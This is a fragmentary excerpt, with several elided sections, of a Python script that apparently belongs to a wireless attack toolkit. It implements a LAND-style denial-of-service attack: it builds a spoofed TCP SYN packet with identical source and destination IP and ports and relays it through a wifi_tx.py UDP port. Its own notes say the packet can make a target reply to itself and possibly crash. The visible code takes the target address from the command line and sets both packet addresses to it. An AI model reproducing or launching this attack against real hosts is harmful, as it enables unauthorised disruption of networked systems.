...
def getArguments():
    ...
    notes = 'Transmits a TCP SYN spoofed packet where the source and destination IPs and ports are identical. This can cause the target to repeatedly send replies to itself and possibly lead to a crash. Messages are placed in UDP data and sent to a wifi_tx.py UDP port.'
    arg_names = ['tcp_source_dest_ip','tcp_source_port','tcp_dest_port','interval','wifi_tx_udp_port','wifi_tx_ip_address','notes']
    arg_values = [tcp_source_dest_ip, tcp_source_port, tcp_dest_port, interval, wifi_tx_udp_port, wifi_tx_ip_address, notes]
...
if __name__ == "__main__":
    ...
    try:
        get_tcp_source_dest_ip = sys.argv[1]
        get_tcp_source_port = int(sys.argv[2])
        get_tcp_dest_port = int(sys.argv[3])
...
#################################################
    ...
    pip_bytes[IP].src = get_tcp_source_dest_ip
    pip_bytes[IP].dst = get_tcp_source_dest_ip
